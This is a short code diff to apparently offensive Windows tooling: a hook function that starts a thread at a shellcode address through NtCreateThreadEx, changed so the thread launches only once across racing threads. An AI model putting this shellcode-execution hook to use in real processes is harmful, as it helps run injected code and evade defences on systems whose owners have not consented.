@@ -38,10 +38,11 @@ void DisposableHook(LPVOID shellcodeAddr, char *threadCreated) {
 	HANDLE tHandle = NULL;
 	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
 
-	*threadCreated = 1;		//avoid recursion
+	if (InterlockedExchange8((CHAR*)threadCreated, 1) == 1) //avoid recursion + check if another thread already run DisposableHook function
+		return;
 	status = NtCreateThreadEx(&tHandle, GENERIC_EXECUTE, &objAttr, (HANDLE)-1, (LPVOID)shellcodeAddr, NULL, FALSE, 0, 0, 0, NULL);
-	if (status != 0) 
-		*threadCreated = 0; //thread creation failed, reset flag
+	if (status != 0)
+		InterlockedExchange8((CHAR*)threadCreated, 0); //thread creation failed, reset flag
 }
 
 DWORD WINAPI SampleFunction(LPVOID lpParam)
